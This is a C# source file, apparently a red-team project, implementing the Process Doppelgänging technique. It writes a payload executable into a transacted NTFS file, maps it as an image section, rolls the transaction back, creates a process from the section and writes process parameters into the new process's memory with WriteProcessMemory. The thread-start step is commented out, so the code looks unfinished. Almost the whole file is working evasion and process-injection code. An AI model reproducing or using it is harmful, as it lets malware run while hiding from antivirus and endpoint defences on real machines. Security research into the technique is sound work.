using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

namespace ProcessDoppleganging
{
    class Program
    {
        [DllImport("Kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("KtmW32.dll",SetLastError =true)]
        public static extern IntPtr CreateTransaction(
            IntPtr lpTransactionAttributes,
            IntPtr UOW,
            UInt32 CreateOptions,
            UInt32 IsolationLevel,
            UInt32 IsolationFlags,
            UInt32 Timeout,
            [MarshalAs(UnmanagedType.LPWStr)] string Description
            );


        [DllImport("Kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateFileTransactedA(
            string filename,
            UInt32 dwDesiredAccess,
            UInt32 dwShareMode,
            IntPtr lpSecurityAttributes,
            UInt32 dwCreationDisposition,
            UInt32 dwFlagsAndAttributes,
            IntPtr hTemplateFile,
            IntPtr hTransaction,
            UInt16 pusMiniVersion,
            IntPtr lpExtendedParameter
            );


        [DllImport("KtmW32.dll")]
        public static extern bool CommitTransaction(IntPtr thandle);


        [DllImport("KtmW32.dll")]
        public static extern bool RollbackTransaction(IntPtr thandle);


        [DllImport("Kernel32.dll",SetLastError =true)]
        public static extern bool WriteFile(
            IntPtr filehandle,
            byte[] lpBuffer,
            UInt32 nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped
            );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer,
   uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);



        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(
            ref IntPtr SectionHandle,
            UInt32 DesiredAccess,
            IntPtr ObjectAttributes,
            ref UInt32 MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);



        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtCreateProcessEx(
            out IntPtr prochandle,
            UInt32 desiredaccess,
            IntPtr objectattributes,
            IntPtr parentproc,
            UInt32 flags,
            IntPtr sechandle,
            IntPtr debugport,
            IntPtr exceptionport,
            bool injob
            
            );

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr buffer;
        }


        public static UNICODE_STRING stringToUNICODE_STRING(string name)
        {
            UNICODE_STRING us = new UNICODE_STRING();
            byte[] content = Encoding.UTF8.GetBytes(name);


            IntPtr baseptr = Marshal.StringToHGlobalUni(name);

            us.buffer = baseptr;
            us.Length = (ushort) ((name.Length*2) + 1);
            us.MaximumLength = (ushort)((name.Length * 2) + 2);

            return us;
        }


        public static string UNICODE_STRINGToString(UNICODE_STRING us)
        {
            string res;

            res = Marshal.PtrToStringUni(us.buffer);

            return res;
        }


            [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int RtlCreateProcessParametersEx(
            ref IntPtr ProcessParameters,
            ref UNICODE_STRING imagepath,
            IntPtr dllpath,
            ref UNICODE_STRING currentdir,
            ref UNICODE_STRING commandline,
            IntPtr environment,
            ref UNICODE_STRING windowtitle,
            ref UNICODE_STRING desktopinfo,
            IntPtr shellinfo,
            IntPtr runtimedata,
            UInt32 flags
            );



        [StructLayout(LayoutKind.Sequential)]
        public struct RtlUserProcessParameters
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] Reserved1;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public IntPtr[] Reserved2;
            public UNICODE_STRING ImagePathName;
            public UNICODE_STRING CommandLine;
            public IntPtr Environment;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 9)]
            public IntPtr[] Reserved3; // StartingPositionLeft, -Top, Width, Height, CharWidth, -Height, ConsoleTextAttributes, WindowFlags, ShowWindowFlags
            public UNICODE_STRING WindowTitle;
            public UNICODE_STRING DesktopName;
            public UNICODE_STRING ShellInfo;
            public UNICODE_STRING RuntimeData;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32 * 4)]
            public IntPtr[] Reserved4;
            public uint EnvironmentSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RtlUserProcessParameters64
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public byte[] Reserved1;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public IntPtr[] Reserved2;
            public UNICODE_STRING CurrentDirectoryPath;
            public UNICODE_STRING DllPath;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public IntPtr[] Reserved2b;
            public UNICODE_STRING ImagePathName;
            public UNICODE_STRING CommandLine;
            public UInt64 Environment;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 9)]
            public IntPtr[] Reserved3; // StartingPositionLeft, -Top, Width, Height, CharWidth, -Height, ConsoleTextAttributes, WindowFlags, ShowWindowFlags
            public UNICODE_STRING WindowTitle;
            public UNICODE_STRING DesktopName;
            public UNICODE_STRING ShellInfo;
            public UNICODE_STRING RuntimeData;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32 * 6)]
            public IntPtr[] Reserved4;
            public uint EnvironmentSize;
        }


        public static int GetSizeofHeaders(byte[] rawfile)
        {
            int size = 0;

            byte[] lfanew = new byte[4];
            for (int i = 0; i < lfanew.Length; i++)
            {
                lfanew[i] = rawfile[i + 60];
                //Console.WriteLine(lfanew[i].ToString("X2"));
            }

            int peoffset = BitConverter.ToInt32(lfanew, 0);
            //Console.WriteLine(peoffset);

            int sizeofheadersoffset = peoffset + 84;

            byte[] headerssize = new byte[4];
            for (int i = 0; i < headerssize.Length; i++)
            {
                headerssize[i] = rawfile[sizeofheadersoffset + i];
            }

            size = BitConverter.ToInt32(headerssize, 0);

            return size;
        }


        public static int GetImageSize(byte[] rawfile)
        {
            int size = 0;

            byte[] lfanew = new byte[4];
            for (int i = 0; i < lfanew.Length; i++)
            {
                lfanew[i] = rawfile[i + 60];
                //Console.WriteLine(lfanew[i].ToString("X2"));
            }

            int peoffset = BitConverter.ToInt32(lfanew, 0);
            //Console.WriteLine(peoffset);

            int sizeofheadersoffset = peoffset + 80;

            byte[] headerssize = new byte[4];
            for (int i = 0; i < headerssize.Length; i++)
            {
                headerssize[i] = rawfile[sizeofheadersoffset + i];
            }

            size = BitConverter.ToInt32(headerssize, 0);

            return size;
        }

        #region declares
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public int ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public int BasePriority;
            public IntPtr UniquePID;
            public IntPtr InheritedFromUniqueProcessId;
        }


        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtQueryInformationProcess(
            IntPtr processHandle,
            int processInformationClass,
             IntPtr processInformation,
            uint processInformationLength,
            ref uint returnLength);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr OpenProcess(
            UInt32 dwDesiredAccess,
            bool bInheritHandle,
            UInt32 dwProcessId
            );




        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetProcAddress(
            IntPtr handle,
            string functionname
            );

        

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            ref uint lpThreadId);


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
   UInt32 dwSize, uint flNewProtect, ref uint lpflOldProtect);

        [DllImport("kernel32.dll",SetLastError =true)]
        public static extern bool WriteProcessMemory(
         IntPtr hProcess,
         IntPtr lpBaseAddress,
         byte[] lpBuffer,
         Int32 nSize,
         ref UInt32 lpNumberOfBytesWritten
        );


        [DllImport("kernel32.dll",SetLastError =true)]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess,
   IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
   IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);



        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
   uint dwSize, uint flAllocationType, uint flProtect);



        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(
               IntPtr hProcess,
               IntPtr lpBaseAddress,
               byte[] lpBuffer,
               Int32 nSize,
               ref uint lpNumberOfBytesRead);


        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProchandle, IntPtr baseAddr);


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }


        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags; //set this to an appropriate value
                                      // Retrieved by CONTEXT_DEBUG_REGISTERS
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            // Retrieved by CONTEXT_FLOATING_POINT
            public FLOATING_SAVE_AREA FloatSave;
            // Retrieved by CONTEXT_SEGMENTS
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            // Retrieved by CONTEXT_INTEGER
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            // Retrieved by CONTEXT_CONTROL
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            // Retrieved by CONTEXT_EXTENDED_REGISTERS
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr prochandle;
            public IntPtr threadhandle;
            public UInt32 processid;
            public UInt32 threadid;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }




        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }


        #endregion



        public static PROCESS_BASIC_INFORMATION GetProcessImageBase(IntPtr prochandle)
        {
            IntPtr imageptr = IntPtr.Zero;

            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();

            IntPtr temp = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)));

            uint length = 0;

            NtQueryInformationProcess(
                prochandle,
                0,
                temp,
                (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
                ref length
                );

            pbi = (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(temp, typeof(PROCESS_BASIC_INFORMATION));

            Console.WriteLine(pbi.PebAddress.ToString("X"));
            byte[] bytebase = new byte[8];
            uint byteswritten = 0;

            ReadProcessMemory(prochandle,
                pbi.PebAddress + 0x10,
                bytebase,
                bytebase.Length,
                ref byteswritten
                );

            imageptr = (IntPtr)BitConverter.ToInt64(bytebase, 0);


            return pbi;

        }




        public static void Main(string[] args)
        {


            IntPtr thandle = CreateTransaction(
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0,
                0,
                0,
                null
                );

            Console.WriteLine(Marshal.GetLastWin32Error());
            Console.WriteLine(thandle);

            string exe_path = @"D:\python\temp.exe";
            string payload_path = @"D:\red teaming tools\calc2.exe";

            IntPtr filehandle =CreateFileTransactedA(
                @"D:\python\temp.exe",
                0x40000000| 0x80000000,
                0x00000002,
                IntPtr.Zero,
                2,
                0x80,
                IntPtr.Zero,
                thandle,
                0,
                IntPtr.Zero
                );

            Console.WriteLine(Marshal.GetLastWin32Error());
            Console.WriteLine(filehandle);

            byte[] content = File.ReadAllBytes(payload_path);

            uint byteswritten;
            IntPtr overlapped = IntPtr.Zero;
            WriteFile(filehandle, content, (uint)content.Length,
                out byteswritten, overlapped);

            Console.WriteLine("bytes written: {0}",byteswritten);
            Console.WriteLine(Marshal.GetLastWin32Error());

            /*byte[] toread = new byte[content.Length];
            uint bytesread = 0;
            ReadFile(filehandle,
             toread, (uint) content.Length, out bytesread, IntPtr.Zero);


            for(int i = 0; i < 4; i++)
            {
                Console.WriteLine(toread[i].ToString("X"));
            }*/
            IntPtr SectionHandle = IntPtr.Zero;
            uint MaximumSize = 2048;
             uint SEC_COMMIT = 0x08000000;
             uint SECTION_MAP_WRITE = 0x0002;
             uint SECTION_MAP_READ = 0x0004;
             uint SECTION_MAP_EXECUTE = 0x0008;
            uint SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;


            IntPtr sechandle = IntPtr.Zero;

            uint maxsize = 0;
            NtCreateSection(
                ref sechandle,
                SECTION_ALL_ACCESS,
                IntPtr.Zero,
                ref maxsize,
                0x02,
                0x1000000,
                filehandle
                );

            RollbackTransaction(thandle);
            CloseHandle(thandle);

            Console.WriteLine("section error: {0}",Marshal.GetLastWin32Error());
            Console.WriteLine(sechandle);
            
            IntPtr prochandle;

            NtCreateProcessEx(
                out prochandle,
                0x000F0000 | 0x00100000 | 0xFFFF,
                //0x10000000,
                //0x0080,
                IntPtr.Zero,
                Process.GetCurrentProcess().Handle,
                4,
                sechandle,
                IntPtr.Zero,
                IntPtr.Zero,
                false
                );


            Console.WriteLine("Process creation error: {0}",Marshal.GetLastWin32Error());
            Console.WriteLine(prochandle);

            IntPtr procparams = IntPtr.Zero;
            UNICODE_STRING imagepath = stringToUNICODE_STRING(exe_path);
            UNICODE_STRING currentdir = stringToUNICODE_STRING(@"D:\python");
            UNICODE_STRING cmdline = stringToUNICODE_STRING(@"D:\python");
            UNICODE_STRING windowtitle = stringToUNICODE_STRING("test");
            UNICODE_STRING desktopinfo = stringToUNICODE_STRING("test2");

            //RtlUserProcessParameters upp = new RtlUserProcessParameters();
           
             IntPtr uppptr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(RtlUserProcessParameters64)));
            

            RtlCreateProcessParametersEx(
                ref uppptr,
                ref imagepath,
                IntPtr.Zero,
                ref currentdir,
                ref cmdline,
                IntPtr.Zero,
                ref windowtitle,
                ref desktopinfo,
                IntPtr.Zero,
                IntPtr.Zero,
                1
                );

            Console.WriteLine("Setting error: {0}",Marshal.GetLastWin32Error());

            RtlUserProcessParameters upp = (RtlUserProcessParameters) Marshal.PtrToStructure(uppptr, typeof(RtlUserProcessParameters));

            Console.WriteLine(UNICODE_STRINGToString(upp.ImagePathName));
            Console.WriteLine(UNICODE_STRINGToString(upp.CommandLine));


            PROCESS_BASIC_INFORMATION pbi= GetProcessImageBase(prochandle);
            Console.WriteLine(pbi.PebAddress.ToString("X"));


            // 0x20 offset for process parameters on 64 bit
            // 0x10 offset on 32 bit

            IntPtr startingptr = VirtualAllocEx(
                prochandle,
                IntPtr.Zero,
               (uint) Marshal.SizeOf(typeof(RtlUserProcessParameters)),
                0x00001000| 0x00002000  ,
                0x40
                );

            Console.WriteLine("Memory allocated at: {0}",startingptr.ToString("X"));

            byte[] towrite = new byte[Marshal.SizeOf(typeof(RtlUserProcessParameters))];

            IntPtr temp = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(RtlUserProcessParameters)));
            Marshal.StructureToPtr(upp, temp, false);

            Marshal.Copy(temp, towrite, 0, Marshal.SizeOf(typeof(RtlUserProcessParameters)));

            Console.WriteLine(towrite.Length);

            uint byteswritten2 = 0;
            WriteProcessMemory(prochandle,
                startingptr,
                towrite,
                towrite.Length,
                ref byteswritten2
                );
            Console.WriteLine("Bytes written: {0}",byteswritten2);

            long addr = startingptr.ToInt64();
            byte[] test= BitConverter.GetBytes(addr);
            uint outwritten = 0;
            WriteProcessMemory(
                prochandle,
                pbi.PebAddress + 0x20,
                test,
                8,
                ref outwritten
                );
            Console.WriteLine(Marshal.GetLastWin32Error());

            byte[] imagebase = new byte[8];
            ReadProcessMemory(prochandle, pbi.PebAddress + 0x10,
                imagebase, 8, ref outwritten);

            long remotebase =BitConverter.ToInt64(imagebase, 0);
            Console.WriteLine(remotebase.ToString("X"));
            //  Console.WriteLine(outwritten);



            #region backup
            /* PROCESS_BASIC_INFORMATION pbi = GetProcessImageBase(prochandle);
             Console.WriteLine(pbi.PebAddress.ToString("X"));


             IntPtr startingptr = VirtualAllocEx(
                 prochandle,
                 IntPtr.Zero,
                (uint)Marshal.SizeOf(typeof(RtlUserProcessParameters)),
                 0x00001000 | 0x00002000,
                 0x04
                 );

             Console.WriteLine("Memory allocated at: {0}", startingptr.ToString("X"));

             // commandline offset 0x70 64bit

             IntPtr tempptr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
             Marshal.StructureToPtr(cmdline, tempptr, true);

             Console.WriteLine(tempptr.ToString("X"));

             byte[] bytecmdline = new byte[Marshal.SizeOf(typeof(UNICODE_STRING))];
             Marshal.Copy(tempptr, bytecmdline, 0, Marshal.SizeOf(typeof(UNICODE_STRING)));

             uint bytesout = 0;
             WriteProcessMemory(
                 prochandle,
                 startingptr + 0x70,
                 bytecmdline,
                 bytecmdline.Length,
                 ref bytesout
                 );



             long addr = startingptr.ToInt64();
             byte[] test = BitConverter.GetBytes(addr);
             uint outwritten = 0;
             WriteProcessMemory(
                 prochandle,
                 pbi.PebAddress + 0x20,
                 test,
                 8,
                 ref outwritten
                 );
             Console.WriteLine(Marshal.GetLastWin32Error());*/
            #endregion



            uint threadid = 0;
            

            /*IntPtr threadhandle =CreateRemoteThread(
                prochandle,
                IntPtr.Zero,
                0,
               (IntPtr) (remotebase) + (0x4000),
                IntPtr.Zero,
                0,
                ref threadid
                ) ;
            Console.WriteLine(Marshal.GetLastWin32Error());
           // Console.WriteLine(threadid);*/

            




            NtClose(sechandle);
           
            
            
            CloseHandle(filehandle);

            

            Console.ReadKey();
        }
    }
}
